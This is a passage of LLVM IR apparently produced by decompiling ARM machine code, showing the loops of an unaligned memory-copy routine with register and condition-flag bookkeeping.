  store i32 %v2_14080, i32* %lr.global-to-local, align 4
  %v4_14080 = add i32 %v1_1407c, 4
  store i32 %v4_14080, i32* %r1.global-to-local, align 4
  %v1_140fc = add i32 %v0_14104, -12
  %v3_140fc = sub i32 11, %v0_14104
  %v4_140fc = and i32 %v3_140fc, %v0_14104
  %v5_140fc = icmp slt i32 %v4_140fc, 0
  store i1 %v5_140fc, i1* %cpsr_v.global-to-local, align 1
  %v6_140fc = icmp slt i32 %v1_140fc, 0
  store i1 %v6_140fc, i1* %cpsr_n.global-to-local, align 1
  %v7_140fc = icmp eq i32 %v0_14104, 12
  store i1 %v7_140fc, i1* %cpsr_z.global-to-local, align 1
  %v2_14100 = xor i1 %v6_140fc, %v5_140fc
  switch i2 %v0_14084.off0, label %dec_label_pc_14090 [
    i2 -1, label %dec_label_pc_14168
    i2 -2, label %dec_label_pc_140fc
  ]

dec_label_pc_14090:                               ; preds = %dec_label_pc_1407c
  br i1 %v2_14100, label %dec_label_pc_140dc, label %dec_label_pc_14098

dec_label_pc_14098:                               ; preds = %dec_label_pc_14090
  store i32 %v1_140fc, i32* %r2.global-to-local, align 4
  %v3_1409c = load i32, i32* @r4, align 4
  store i32 %v3_1409c, i32* %stack_var_-16, align 4
  %v6_1409c = load i32, i32* @r5, align 4
  store i32 %v6_1409c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %dec_label_pc_140a0.dec_label_pc_140a0_crit_edge, %dec_label_pc_14098
  %v0_140c4 = phi i32 [ %v12_140c4, %dec_label_pc_140a0.dec_label_pc_140a0_crit_edge ], [ %v0_1419c75, %dec_label_pc_14098 ]
  %v0_140a4 = phi i32 [ %v0_140a4.pre, %dec_label_pc_140a0.dec_label_pc_140a0_crit_edge ], [ %v4_14080, %dec_label_pc_14098 ]
  %v0_140a0 = phi i32 [ %v0_140a0.pre, %dec_label_pc_140a0.dec_label_pc_140a0_crit_edge ], [ %v2_14080, %dec_label_pc_14098 ]
  %v3_140a0 = udiv i32 %v0_140a0, 256
  %v1_140a4 = inttoptr i32 %v0_140a4 to i32*
  %v2_140a4 = load i32, i32* %v1_140a4, align 4
  store i32 %v2_140a4, i32* %r4.global-to-local, align 4
  %v3_140a4 = add i32 %v0_140a4, 4
  %v4_140a4 = inttoptr i32 %v3_140a4 to i32*
  %v5_140a4 = load i32, i32* %v4_140a4, align 4
  store i32 %v5_140a4, i32* %r5.global-to-local, align 4
  %v6_140a4 = add i32 %v0_140a4, 8
  %v7_140a4 = inttoptr i32 %v6_140a4 to i32*
  %v8_140a4 = load i32, i32* %v7_140a4, align 4
  store i32 %v8_140a4, i32* %ip.global-to-local, align 4
  %v9_140a4 = add i32 %v0_140a4, 12
  %v10_140a4 = inttoptr i32 %v9_140a4 to i32*
  %v11_140a4 = load i32, i32* %v10_140a4, align 4
  store i32 %v11_140a4, i32* %lr.global-to-local, align 4
  %v12_140a4 = add i32 %v0_140a4, 16
  store i32 %v12_140a4, i32* %r1.global-to-local, align 4
  %v4_140a8 = mul i32 %v2_140a4, 16777216
  %v5_140a8 = or i32 %v4_140a8, %v3_140a0
  store i32 %v5_140a8, i32* @r3, align 4
  %v3_140ac = udiv i32 %v2_140a4, 256
  %v4_140b0 = mul i32 %v5_140a4, 16777216
  %v5_140b0 = or i32 %v4_140b0, %v3_140ac
  store i32 %v5_140b0, i32* %r4.global-to-local, align 4
  %v3_140b4 = udiv i32 %v5_140a4, 256
  %v4_140b8 = mul i32 %v8_140a4, 16777216
  %v5_140b8 = or i32 %v4_140b8, %v3_140b4
  store i32 %v5_140b8, i32* %r5.global-to-local, align 4
  %v3_140bc = udiv i32 %v8_140a4, 256
  %v4_140c0 = mul i32 %v11_140a4, 16777216
  %v5_140c0 = or i32 %v4_140c0, %v3_140bc
  store i32 %v5_140c0, i32* @ip, align 4
  %v1_140c4 = inttoptr i32 %v0_140c4 to i32*
  store i32 %v5_140a8, i32* %v1_140c4, align 4
  %v3_140c4 = add i32 %v0_140c4, 4
  %v4_140c4 = inttoptr i32 %v3_140c4 to i32*
  %v5_140c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_140c4, i32* %v4_140c4, align 4
  %v6_140c4 = add i32 %v0_140c4, 8
  %v7_140c4 = inttoptr i32 %v6_140c4 to i32*
  %v8_140c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_140c4, i32* %v7_140c4, align 4
  %v9_140c4 = add i32 %v0_140c4, 12
  %v10_140c4 = inttoptr i32 %v9_140c4 to i32*
  %v11_140c4 = load i32, i32* @ip, align 4
  store i32 %v11_140c4, i32* %v10_140c4, align 4
  %v12_140c4 = add i32 %v0_140c4, 16
  store i32 %v12_140c4, i32* %r0.global-to-local, align 4
  %v0_140c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_140c8 = add i32 %v0_140c8, -16
  store i32 %v1_140c8, i32* %r2.global-to-local, align 4
  %v3_140c8 = sub i32 15, %v0_140c8
  %v4_140c8 = and i32 %v3_140c8, %v0_140c8
  %v5_140c8 = icmp slt i32 %v4_140c8, 0
  %v6_140c8 = icmp slt i32 %v1_140c8, 0
  %v2_140cc = xor i1 %v6_140c8, %v5_140c8
  br i1 %v2_140cc, label %dec_label_pc_140d0, label %dec_label_pc_140a0.dec_label_pc_140a0_crit_edge

dec_label_pc_140a0.dec_label_pc_140a0_crit_edge:  ; preds = %dec_label_pc_140a0
  %v0_140a0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_140a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_140a0

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140a0
  %v2_140d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_140d0, i32* @r4, align 4
  %v5_140d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_140d0, i32* @r5, align 4
  %v1_140d4 = add i32 %v0_140c8, -4
  store i32 %v1_140d4, i32* %r2.global-to-local, align 4
  %v3_140d4 = add i32 %v0_140c8, 2147483632
  %v4_140d4 = and i32 %v1_140d4, %v3_140d4
  %v5_140d4 = icmp slt i32 %v4_140d4, 0
  store i1 %v5_140d4, i1* %cpsr_v.global-to-local, align 1
  %v6_140d4 = icmp slt i32 %v1_140d4, 0
  store i1 %v6_140d4, i1* %cpsr_n.global-to-local, align 1
  %v7_140d4 = icmp eq i32 %v1_140d4, 0
  store i1 %v7_140d4, i1* %cpsr_z.global-to-local, align 1
  %v2_140d8 = xor i1 %v6_140d4, %v5_140d4
  br i1 %v2_140d8, label %dec_label_pc_140f4, label %dec_label_pc_140dc

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140d0, %dec_label_pc_14090, %dec_label_pc_140dc
  %v1_140e8 = phi i32 [ %v4_140e8, %dec_label_pc_140dc ], [ %v12_140c4, %dec_label_pc_140d0 ], [ %v0_1419c75, %dec_label_pc_14090 ]
  %v0_140dc = load i32, i32* %lr.global-to-local, align 4
  %v3_140dc = udiv i32 %v0_140dc, 256
  store i32 %v3_140dc, i32* %ip.global-to-local, align 4
  %v0_140e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_140e0 = inttoptr i32 %v0_140e0 to i32*
  %v2_140e0 = load i32, i32* %v1_140e0, align 4
  store i32 %v2_140e0, i32* %lr.global-to-local, align 4
  %v4_140e0 = add i32 %v0_140e0, 4
  store i32 %v4_140e0, i32* %r1.global-to-local, align 4
  %v4_140e4 = mul i32 %v2_140e0, 16777216
  %v5_140e4 = or i32 %v4_140e4, %v3_140dc
  store i32 %v5_140e4, i32* @ip, align 4
  %v2_140e8 = inttoptr i32 %v1_140e8 to i32*
  store i32 %v5_140e4, i32* %v2_140e8, align 4
  %v3_140e8 = load i32, i32* %r0.global-to-local, align 4
  %v4_140e8 = add i32 %v3_140e8, 4
  store i32 %v4_140e8, i32* %r0.global-to-local, align 4
  %v0_140ec = load i32, i32* %r2.global-to-local, align 4
  %v1_140ec = add i32 %v0_140ec, -4
  store i32 %v1_140ec, i32* %r2.global-to-local, align 4
  %v3_140ec = sub i32 3, %v0_140ec
  %v4_140ec = and i32 %v3_140ec, %v0_140ec
  %v5_140ec = icmp slt i32 %v4_140ec, 0
  %v6_140ec = icmp slt i32 %v1_140ec, 0
  %v2_140f0 = xor i1 %v6_140ec, %v5_140ec
  br i1 %v2_140f0, label %dec_label_pc_140f4.loopexit, label %dec_label_pc_140dc

dec_label_pc_140f4.loopexit:                      ; preds = %dec_label_pc_140dc
  %v7_140ec = icmp eq i32 %v0_140ec, 4
  store i1 %v5_140ec, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_140ec, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_140ec, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_140f4

dec_label_pc_140f4:                               ; preds = %dec_label_pc_140f4.loopexit, %dec_label_pc_140d0
  %v0_1401c58 = phi i32 [ %v1_140ec, %dec_label_pc_140f4.loopexit ], [ %v1_140d4, %dec_label_pc_140d0 ]
  %v0_140f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_140f4 = add i32 %v0_140f4, -3
  store i32 %v1_140f4, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_140fc:                               ; preds = %dec_label_pc_1407c
  br i1 %v2_14100, label %dec_label_pc_14148, label %dec_label_pc_14104

dec_label_pc_14104:                               ; preds = %dec_label_pc_140fc
  store i32 %v1_140fc, i32* %r2.global-to-local, align 4
  %v3_14108 = load i32, i32* @r4, align 4
  store i32 %v3_14108, i32* %stack_var_-16, align 4
  %v6_14108 = load i32, i32* @r5, align 4
  store i32 %v6_14108, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1410c

dec_label_pc_1410c:                               ; preds = %dec_label_pc_1410c.dec_label_pc_1410c_crit_edge, %dec_label_pc_14104
  %v0_14130 = phi i32 [ %v12_14130, %dec_label_pc_1410c.dec_label_pc_1410c_crit_edge ], [ %v0_1419c75, %dec_label_pc_14104 ]
  %v0_14110 = phi i32 [ %v0_14110.pre, %dec_label_pc_1410c.dec_label_pc_1410c_crit_edge ], [ %v4_14080, %dec_label_pc_14104 ]
  %v0_1410c = phi i32 [ %v0_1410c.pre, %dec_label_pc_1410c.dec_label_pc_1410c_crit_edge ], [ %v2_14080, %dec_label_pc_14104 ]
  %v3_1410c = udiv i32 %v0_1410c, 65536
  %v1_14110 = inttoptr i32 %v0_14110 to i32*
  %v2_14110 = load i32, i32* %v1_14110, align 4
  store i32 %v2_14110, i32* %r4.global-to-local, align 4
  %v3_14110 = add i32 %v0_14110, 4
  %v4_14110 = inttoptr i32 %v3_14110 to i32*
  %v5_14110 = load i32, i32* %v4_14110, align 4
  store i32 %v5_14110, i32* %r5.global-to-local, align 4
  %v6_14110 = add i32 %v0_14110, 8
  %v7_14110 = inttoptr i32 %v6_14110 to i32*
  %v8_14110 = load i32, i32* %v7_14110, align 4
  store i32 %v8_14110, i32* %ip.global-to-local, align 4
  %v9_14110 = add i32 %v0_14110, 12
  %v10_14110 = inttoptr i32 %v9_14110 to i32*
  %v11_14110 = load i32, i32* %v10_14110, align 4
  store i32 %v11_14110, i32* %lr.global-to-local, align 4
  %v12_14110 = add i32 %v0_14110, 16
  store i32 %v12_14110, i32* %r1.global-to-local, align 4
  %v4_14114 = mul i32 %v2_14110, 65536
  %v5_14114 = or i32 %v4_14114, %v3_1410c
  store i32 %v5_14114, i32* @r3, align 4
  %v3_14118 = udiv i32 %v2_14110, 65536
  %v4_1411c = mul i32 %v5_14110, 65536
  %v5_1411c = or i32 %v4_1411c, %v3_14118
  store i32 %v5_1411c, i32* %r4.global-to-local, align 4
  %v3_14120 = udiv i32 %v5_14110, 65536
  %v4_14124 = mul i32 %v8_14110, 65536
  %v5_14124 = or i32 %v4_14124, %v3_14120
  store i32 %v5_14124, i32* %r5.global-to-local, align 4
  %v3_14128 = udiv i32 %v8_14110, 65536
  %v4_1412c = mul i32 %v11_14110, 65536
  %v5_1412c = or i32 %v4_1412c, %v3_14128
  store i32 %v5_1412c, i32* @ip, align 4
  %v1_14130 = inttoptr i32 %v0_14130 to i32*
  store i32 %v5_14114, i32* %v1_14130, align 4
  %v3_14130 = add i32 %v0_14130, 4
  %v4_14130 = inttoptr i32 %v3_14130 to i32*
  %v5_14130 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14130, i32* %v4_14130, align 4
  %v6_14130 = add i32 %v0_14130, 8
  %v7_14130 = inttoptr i32 %v6_14130 to i32*
  %v8_14130 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_14130, i32* %v7_14130, align 4
  %v9_14130 = add i32 %v0_14130, 12
  %v10_14130 = inttoptr i32 %v9_14130 to i32*
  %v11_14130 = load i32, i32* @ip, align 4
  store i32 %v11_14130, i32* %v10_14130, align 4
  %v12_14130 = add i32 %v0_14130, 16
  store i32 %v12_14130, i32* %r0.global-to-local, align 4
  %v0_14134 = load i32, i32* %r2.global-to-local, align 4
  %v1_14134 = add i32 %v0_14134, -16
  store i32 %v1_14134, i32* %r2.global-to-local, align 4
  %v3_14134 = sub i32 15, %v0_14134
  %v4_14134 = and i32 %v3_14134, %v0_14134
  %v5_14134 = icmp slt i32 %v4_14134, 0
  %v6_14134 = icmp slt i32 %v1_14134, 0
  %v2_14138 = xor i1 %v6_14134, %v5_14134
  br i1 %v2_14138, label %dec_label_pc_1413c, label %dec_label_pc_1410c.dec_label_pc_1410c_crit_edge

dec_label_pc_1410c.dec_label_pc_1410c_crit_edge:  ; preds = %dec_label_pc_1410c
  %v0_1410c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_14110.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1410c

dec_label_pc_1413c:                               ; preds = %dec_label_pc_1410c
  %v2_1413c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1413c, i32* @r4, align 4
  %v5_1413c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1413c, i32* @r5, align 4
  %v1_14140 = add i32 %v0_14134, -4
  store i32 %v1_14140, i32* %r2.global-to-local, align 4
  %v3_14140 = add i32 %v0_14134, 2147483632
  %v4_14140 = and i32 %v1_14140, %v3_14140
  %v5_14140 = icmp slt i32 %v4_14140, 0
  store i1 %v5_14140, i1* %cpsr_v.global-to-local, align 1
  %v6_14140 = icmp slt i32 %v1_14140, 0
  store i1 %v6_14140, i1* %cpsr_n.global-to-local, align 1
  %v7_14140 = icmp eq i32 %v1_14140, 0
  store i1 %v7_14140, i1* %cpsr_z.global-to-local, align 1
  %v2_14144 = xor i1 %v6_14140, %v5_14140
  br i1 %v2_14144, label %dec_label_pc_14160, label %dec_label_pc_14148

dec_label_pc_14148:                               ; preds = %dec_label_pc_1413c, %dec_label_pc_140fc, %dec_label_pc_14148
  %v1_14154 = phi i32 [ %v4_14154, %dec_label_pc_14148 ], [ %v12_14130, %dec_label_pc_1413c ], [ %v0_1419c75, %dec_label_pc_140fc ]
  %v0_14148 = load i32, i32* %lr.global-to-local, align 4
  %v3_14148 = udiv i32 %v0_14148, 65536
  store i32 %v3_14148, i32* %ip.global-to-local, align 4
  %v0_1414c = load i32, i32* %r1.global-to-local, align 4
  %v1_1414c = inttoptr i32 %v0_1414c to i32*
  %v2_1414c = load i32, i32* %v1_1414c, align 4
  store i32 %v2_1414c, i32* %lr.global-to-local, align 4
  %v4_1414c = add i32 %v0_1414c, 4
  store i32 %v4_1414c, i32* %r1.global-to-local, align 4
  %v4_14150 = mul i32 %v2_1414c, 65536
  %v5_14150 = or i32 %v4_14150, %v3_14148
  store i32 %v5_14150, i32* @ip, align 4
  %v2_14154 = inttoptr i32 %v1_14154 to i32*
  store i32 %v5_14150, i32* %v2_14154, align 4
  %v3_14154 = load i32, i32* %r0.global-to-local, align 4
  %v4_14154 = add i32 %v3_14154, 4
  store i32 %v4_14154, i32* %r0.global-to-local, align 4
  %v0_14158 = load i32, i32* %r2.global-to-local, align 4
  %v1_14158 = add i32 %v0_14158, -4
  store i32 %v1_14158, i32* %r2.global-to-local, align 4
  %v3_14158 = sub i32 3, %v0_14158
  %v4_14158 = and i32 %v3_14158, %v0_14158
  %v5_14158 = icmp slt i32 %v4_14158, 0
  %v6_14158 = icmp slt i32 %v1_14158, 0
  %v2_1415c = xor i1 %v6_14158, %v5_14158
  br i1 %v2_1415c, label %dec_label_pc_14160.loopexit, label %dec_label_pc_14148

dec_label_pc_14160.loopexit:                      ; preds = %dec_label_pc_14148
  %v7_14158 = icmp eq i32 %v0_14158, 4
  store i1 %v5_14158, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_14158, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_14158, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14160

dec_label_pc_14160:                               ; preds = %dec_label_pc_14160.loopexit, %dec_label_pc_1413c
  %v0_1401c59 = phi i32 [ %v1_14158, %dec_label_pc_14160.loopexit ], [ %v1_14140, %dec_label_pc_1413c ]
  %v0_14160 = load i32, i32* %r1.global-to-local, align 4
  %v1_14160 = add i32 %v0_14160, -2
  store i32 %v1_14160, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_14168:                               ; preds = %dec_label_pc_1407c
  br i1 %v2_14100, label %dec_label_pc_141b4, label %dec_label_pc_14170

dec_label_pc_14170:                               ; preds = %dec_label_pc_14168
  store i32 %v1_140fc, i32* %r2.global-to-local, align 4
  %v3_14174 = load i32, i32* @r4, align 4
  store i32 %v3_14174, i32* %stack_var_-16, align 4
  %v6_14174 = load i32, i32* @r5, align 4
  store i32 %v6_14174, i32* %stack_var_-12, align 4
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14178.dec_label_pc_14178_crit_edge, %dec_label_pc_14170
  %v0_1419c = phi i32 [ %v12_1419c, %dec_label_pc_14178.dec_label_pc_14178_crit_edge ], [ %v0_1419c75, %dec_label_pc_14170 ]
  %v0_1417c = phi i32 [ %v0_1417c.pre, %dec_label_pc_14178.dec_label_pc_14178_crit_edge ], [ %v4_14080, %dec_label_pc_14170 ]
  %v0_14178 = phi i32 [ %v0_14178.pre, %dec_label_pc_14178.dec_label_pc_14178_crit_edge ], [ %v2_14080, %dec_label_pc_14170 ]
  %v3_14178 = udiv i32 %v0_14178, 16777216
  %v1_1417c = inttoptr i32 %v0_1417c to i32*
  %v2_1417c = load i32, i32* %v1_1417c, align 4
  store i32 %v2_1417c, i32* %r4.global-to-local, align 4
  %v3_1417c = add i32 %v0_1417c, 4
  %v4_1417c = inttoptr i32 %v3_1417c to i32*
  %v5_1417c = load i32, i32* %v4_1417c, align 4
  store i32 %v5_1417c, i32* %r5.global-to-local, align 4
  %v6_1417c = add i32 %v0_1417c, 8
  %v7_1417c = inttoptr i32 %v6_1417c to i32*
  %v8_1417c = load i32, i32* %v7_1417c, align 4
  store i32 %v8_1417c, i32* %ip.global-to-local, align 4
  %v9_1417c = add i32 %v0_1417c, 12
  %v10_1417c = inttoptr i32 %v9_1417c to i32*
  %v11_1417c = load i32, i32* %v10_1417c, align 4
  store i32 %v11_1417c, i32* %lr.global-to-local, align 4
  %v12_1417c = add i32 %v0_1417c, 16
  store i32 %v12_1417c, i32* %r1.global-to-local, align 4
  %v4_14180 = mul i32 %v2_1417c, 256
  %v5_14180 = or i32 %v4_14180, %v3_14178
  store i32 %v5_14180, i32* @r3, align 4
  %v3_14184 = udiv i32 %v2_1417c, 16777216
  %v4_14188 = mul i32 %v5_1417c, 256
  %v5_14188 = or i32 %v4_14188, %v3_14184
  store i32 %v5_14188, i32* %r4.global-to-local, align 4
  %v3_1418c = udiv i32 %v5_1417c, 16777216
  %v4_14190 = mul i32 %v8_1417c, 256
  %v5_14190 = or i32 %v4_14190, %v3_1418c
  store i32 %v5_14190, i32* %r5.global-to-local, align 4
  %v3_14194 = udiv i32 %v8_1417c, 16777216
  %v4_14198 = mul i32 %v11_1417c, 256
  %v5_14198 = or i32 %v4_14198, %v3_14194
  store i32 %v5_14198, i32* @ip, align 4
  %v1_1419c = inttoptr i32 %v0_1419c to i32*
  store i32 %v5_14180, i32* %v1_1419c, align 4
  %v3_1419c = add i32 %v0_1419c, 4
  %v4_1419c = inttoptr i32 %v3_1419c to i32*
  %v5_1419c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1419c, i32* %v4_1419c, align 4
  %v6_1419c = add i32 %v0_1419c, 8
  %v7_1419c = inttoptr i32 %v6_1419c to i32*
  %v8_1419c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1419c, i32* %v7_1419c, align 4
  %v9_1419c = add i32 %v0_1419c, 12
  %v10_1419c = inttoptr i32 %v9_1419c to i32*
  %v11_1419c = load i32, i32* @ip, align 4
  store i32 %v11_1419c, i32* %v10_1419c, align 4
  %v12_1419c = add i32 %v0_1419c, 16
  store i32 %v12_1419c, i32* %r0.global-to-local, align 4
  %v0_141a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_141a0 = add i32 %v0_141a0, -16
  store i32 %v1_141a0, i32* %r2.global-to-local, align 4
  %v3_141a0 = sub i32 15, %v0_141a0
  %v4_141a0 = and i32 %v3_141a0, %v0_141a0
  %v5_141a0 = icmp slt i32 %v4_141a0, 0
  %v6_141a0 = icmp slt i32 %v1_141a0, 0
  %v2_141a4 = xor i1 %v6_141a0, %v5_141a0
  br i1 %v2_141a4, label %dec_label_pc_141a8, label %dec_label_pc_14178.dec_label_pc_14178_crit_edge

dec_label_pc_14178.dec_label_pc_14178_crit_edge:  ; preds = %dec_label_pc_14178
  %v0_14178.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1417c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_141a8:                               ; preds = %dec_label_pc_14178
  %v2_141a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_141a8, i32* @r4, align 4
  %v5_141a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_141a8, i32* @r5, align 4
  %v1_141ac = add i32 %v0_141a0, -4
  store i32 %v1_141ac, i32* %r2.global-to-local, align 4
  %v3_141ac = add i32 %v0_141a0, 2147483632
  %v4_141ac = and i32 %v1_141ac, %v3_141ac
  %v5_141ac = icmp slt i32 %v4_141ac, 0
  store i1 %v5_141ac, i1* %cpsr_v.global-to-local, align 1
  %v6_141ac = icmp slt i32 %v1_141ac, 0
  store i1 %v6_141ac, i1* %cpsr_n.global-to-local, align 1
  %v7_141ac = icmp eq i32 %v1_141ac, 0
  store i1 %v7_141ac, i1* %cpsr_z.global-to-local, align 1
  %v2_141b0 = xor i1 %v6_141ac, %v5_141ac
  br i1 %v2_141b0, label %dec_label_pc_141cc, label %dec_label_pc_141b4

dec_label_pc_141b4:                               ; preds = %dec_label_pc_141a8, %dec_label_pc_14168, %dec_label_pc_141b4
  %v1_141c0 = phi i32 [ %v4_141c0, %dec_label_pc_141b4 ], [ %v12_1419c, %dec_label_pc_141a8 ], [ %v0_1419c75, %dec_label_pc_14168 ]
  %v0_141b4 = load i32, i32* %lr.global-to-local, align 4
  %v3_141b4 = udiv i32 %v0_141b4, 16777216
  store i32 %v3_141b4, i32* %ip.global-to-local, align 4
  %v0_141b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_141b8 = inttoptr i32 %v0_141b8 to i32*
  %v2_141b8 = load i32, i32* %v1_141b8, align 4
  store i32 %v2_141b8, i32* %lr.global-to-local, align 4
  %v4_141b8 = add i32 %v0_141b8, 4
  store i32 %v4_141b8, i32* %r1.global-to-local, align 4
  %v4_141bc = mul i32 %v2_141b8, 256
  %v5_141bc = or i32 %v4_141bc, %v3_141b4
  store i32 %v5_141bc, i32* @ip, align 4
  %v2_141c0 = inttoptr i32 %v1_141c0 to i32*
  store i32 %v5_141bc, i32* %v2_141c0, align 4
  %v3_141c0 = load i32, i32* %r0.global-to-local, align 4
  %v4_141c0 = add i32 %v3_141c0, 4
  store i32 %v4_141c0, i32* %r0.global-to-local, align 4
  %v0_141c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_141c4 = add i32 %v0_141c4, -4
  store i32 %v1_141c4, i32* %r2.global-to-local, align 4
  %v3_141c4 = sub i32 3, %v0_141c4
  %v4_141c4 = and i32 %v3_141c4, %v0_141c4
  %v5_141c4 = icmp slt i32 %v4_141c4, 0
  %v6_141c4 = icmp slt i32 %v1_141c4, 0
  %v2_141c8 = xor i1 %v6_141c4, %v5_141c4
  br i1 %v2_141c8, label %dec_label_pc_141cc.loopexit, label %dec_label_pc_141b4

dec_label_pc_141cc.loopexit:                      ; preds = %dec_label_pc_141b4
  %v7_141c4 = icmp eq i32 %v0_141c4, 4
  store i1 %v5_141c4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_141c4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_141c4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_141cc

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141cc.loopexit, %dec_label_pc_141a8
  %v0_1401c60 = phi i32 [ %v1_141c4, %dec_label_pc_141cc.loopexit ], [ %v1_141ac, %dec_label_pc_141a8 ]
  %v0_141cc = load i32, i32* %r1.global-to-local, align 4
  %v1_141cc = add i32 %v0_141cc, -1
  store i32 %v1_141cc, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_141d4:                               ; preds = %dec_label_pc_13f80
  %v1_141d4 = load i32, i32* @r2, align 4
  %v2_141d4 = add i32 %v1_141d4, %v0_13f80
  store i32 %v2_141d4, i32* %r1.global-to-local, align 4
  %v2_141d8 = add i32 %v1_141d4, %v1_13f80
  store i32 %v2_141d8, i32* %r0.global-to-local, align 4
  %v2_141dc = add i32 %v1_141d4, -4
  store i32 %v2_141dc, i32* %r2.global-to-local, align 4
  %v4_141dc = sub i32 3, %v1_141d4
  %v5_141dc = and i32 %v4_141dc, %v1_141d4
  %v6_141dc = icmp slt i32 %v5_141dc, 0
  store i1 %v6_141dc, i1* %cpsr_v.global-to-local, align 1
  %v7_141dc = icmp slt i32 %v2_141dc, 0
  store i1 %v7_141dc, i1* %cpsr_n.global-to-local, align 1
  %v8_141dc = icmp eq i32 %v1_141d4, 4
  store i1 %v8_141dc, i1* %cpsr_z.global-to-local, align 1
  %v5_141e0 = icmp slt i32 %v1_141d4, 4
  br i1 %v5_141e0, label %bb150, label %dec_label_pc_141e4

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141d4
  %v1_141e4 = urem i32 %v2_141d8, 4
  store i32 %v1_141e4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_141e4 = icmp eq i32 %v1_141e4, 0
  store i1 %v2_141e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141e4, label %dec_label_pc_141ec, label %dec_label_pc_1428c

dec_label_pc_141ec:                               ; preds = %dec_label_pc_141e4
  %v1_141ec = urem i32 %v2_141d4, 4
  store i32 %v1_141ec, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_141ec = icmp eq i32 %v1_141ec, 0
  store i1 %v2_141ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141ec, label %dec_label_pc_141f4, label %dec_label_pc_142b8

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141ec, %dec_label_pc_142b0
  %v0_1420c36 = phi i32 [ %v2_141d8, %dec_label_pc_141ec ], [ %v0_1430019, %dec_label_pc_142b0 ]
  %v0_1420835 = phi i32 [ %v2_141d4, %dec_label_pc_141ec ], [ %v0_142b0, %dec_label_pc_142b0 ]
  %v0_141f4 = phi i32 [ %v2_141dc, %dec_label_pc_141ec ], [ %v2_142a8, %dec_label_pc_142b0 ]
  %v2_141f4 = add i32 %v0_141f4, -8
  store i32 %v2_141f4, i32* %r2.global-to-local, align 4
  %v4_141f4 = sub i32 7, %v0_141f4
  %v5_141f4 = and i32 %v4_141f4, %v0_141f4
  %v6_141f4 = icmp slt i32 %v5_141f4, 0
  store i1 %v6_141f4, i1* %cpsr_v.global-to-local, align 1
  %v7_141f4 = icmp slt i32 %v2_141f4, 0
  store i1 %v7_141f4, i1* %cpsr_n.global-to-local, align 1
  %v8_141f4 = icmp eq i32 %v0_141f4, 8
  store i1 %v8_141f4, i1* %cpsr_z.global-to-local, align 1
  %v5_141f8 = icmp slt i32 %v0_141f4, 8
  br i1 %v5_141f8, label %dec_label_pc_14244, label %dec_label_pc_141fc

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141f4
  %v3_141fc = load i32, i32* @r4, align 4
  %v5_141fc = inttoptr i32 %v3_141fc to i8*
  store i8* %v5_141fc, i8** %stack_var_-8, align 4
  %v8_141fc = load i32, i32* @lr, align 4
  %v2_14200 = add i32 %v0_141f4, -28
  store i32 %v2_14200, i32* %r2.global-to-local, align 4
  %v4_14200 = sub i32 27, %v0_141f4
  %v5_14200 = and i32 %v4_14200, %v2_141f4
  %v6_14200 = icmp slt i32 %v5_14200, 0
  store i1 %v6_14200, i1* %cpsr_v.global-to-local, align 1
  %v7_14200 = icmp slt i32 %v2_14200, 0
  store i1 %v7_14200, i1* %cpsr_n.global-to-local, align 1
  %v8_14200 = icmp eq i32 %v2_141f4, 20
  store i1 %v8_14200, i1* %cpsr_z.global-to-local, align 1
  %v5_14204 = icmp slt i32 %v2_141f4, 20
  br i1 %v5_14204, label %dec_label_pc_14220, label %dec_label_pc_14208

dec_label_pc_14208:                               ; preds = %dec_label_pc_141fc, %dec_label_pc_14208.dec_label_pc_14208_crit_edge
  %v0_1420c = phi i32 [ %v1_14214, %dec_label_pc_14208.dec_label_pc_14208_crit_edge ], [ %v0_1420c36, %dec_label_pc_141fc ]
